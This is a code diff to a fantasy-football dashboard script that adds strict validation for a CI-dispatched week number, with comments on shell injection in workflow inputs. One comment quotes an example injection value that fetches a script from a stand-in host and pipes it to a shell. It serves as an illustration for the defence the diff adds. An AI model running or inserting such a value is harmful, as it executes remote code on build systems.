@@ -16,6 +16,8 @@ P(win) is the closed form from gridiron.winprob, labelled UNCALIBRATED.
 from __future__ import annotations
 
 import argparse
+import os
+import re
 import sys
 from datetime import datetime, timezone
 from pathlib import Path
@@ -40,6 +42,53 @@ SOURCES = ("sleeper_league", "sleeper_players", "injuries", "schedules",
            "weekly_stats", "snap_counts", "crosswalk")
 
 DASHBOARD_DIR = OUTPUTS / "dashboard"
+
+#: A scheduled cloud build may be dispatched for a specific week. The value
+#: arrives from `workflow_dispatch`, which means it is whatever text the
+#: dispatcher typed — it is INPUT, not configuration. It is read from the
+#: environment rather than interpolated into the job's shell command, because
+#: `${{ inputs.week }}` pasted into a `run:` block is executed by the shell
+#: before Python ever sees it: `3; curl evil.sh | sh` is a valid string in
+#: that box. Passing it through the environment makes it a value, and the
+#: validation below is what turns a value into a week.
+WEEK_ENV = "GRIDIRON_WEEK"
+
+#: Sleeper numbers the regular season 1-18 and runs playoff weeks past it.
+#: The ceiling is deliberately loose and the floor is not: week 0 and negative
+#: weeks are not weeks, and anything outside the range is refused rather than
+#: clamped, because a clamped week renders a confident page about the wrong
+#: games.
+WEEK_MIN, WEEK_MAX = 1, 22
+
+_ASCII_WEEK = re.compile(r"[0-9]{1,2}")
+
+
+def week_from_env(raw: str | None) -> int | None:
+    """Validate a dispatched week. Returns None when none was given.
+
+    Refuses anything that is not a bare non-negative integer in range. The
+    offending text is echoed with `!r` so a log shows exactly what arrived,
+    quoted, as the data it is — never re-emitted into a command.
+    """
+    if raw is None:
+        return None
+    text = raw.strip()
+    if not text:
+        return None
+    # `str.isdigit()` is true for Arabic-Indic and other non-ASCII digits,
+    # which `int()` then happily converts — so a week could arrive spelled in
+    # a script nobody typed on purpose. Accept ASCII digits and nothing else.
+    if not _ASCII_WEEK.fullmatch(text):
+        raise SystemExit(
+            f"REFUSING: {WEEK_ENV}={raw!r} is not a week. Expected a plain "
+            f"integer between {WEEK_MIN} and {WEEK_MAX}; this value was treated "
+            f"as data and no part of it was run or passed on.")
+    week = int(text)
+    if not (WEEK_MIN <= week <= WEEK_MAX):
+        raise SystemExit(
+            f"REFUSING: {WEEK_ENV}={raw!r} is outside weeks "
+            f"{WEEK_MIN}-{WEEK_MAX}.")
+    return week
 
 
 def kickoffs_for(schedule: pd.DataFrame | None, week: int) -> list[datetime]:
@@ -112,7 +161,8 @@ def main(argv: list[str] | None = None) -> int:
         print(f"REFUSING: the cached Sleeper snapshot is season {state_season}, "
               f"the requested dashboard is {args.season}.", file=sys.stderr)
         return 2
-    report_week = int(args.week or state.get("week") or 0)
+    dispatched = week_from_env(os.environ.get(WEEK_ENV))
+    report_week = int(args.week or dispatched or state.get("week") or 0)
     if report_week < 1:
         print(f"No in-season week to render: Sleeper state is season {state_season}, "
               f"week {state.get('week')!r}. Pass --week for a past week.", file=sys.stderr)
